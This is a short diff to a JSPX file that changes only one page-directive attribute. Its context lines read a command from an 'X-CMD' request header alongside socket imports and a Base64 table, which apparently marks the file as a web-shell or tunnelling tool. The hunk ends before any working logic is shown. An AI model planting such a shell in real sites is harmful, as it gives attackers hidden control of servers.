@@ -1,5 +1,5 @@
 <jsp:root version="2.0" xmlns:jsp="http://java.sun.com/JSP/Page">
-<jsp:directive.page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket" trimDirectiveWhitespaces="true" contentType="text/html"/>
+<jsp:directive.page import="java.nio.ByteBuffer, java.net.InetSocketAddress, java.nio.channels.SocketChannel, java.util.Arrays, java.io.IOException, java.net.UnknownHostException, java.net.Socket" contentType="text/html"/>
 <jsp:scriptlet><![CDATA[
 	String cmd = request.getHeader("X-CMD");
 	char[] en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".toCharArray();
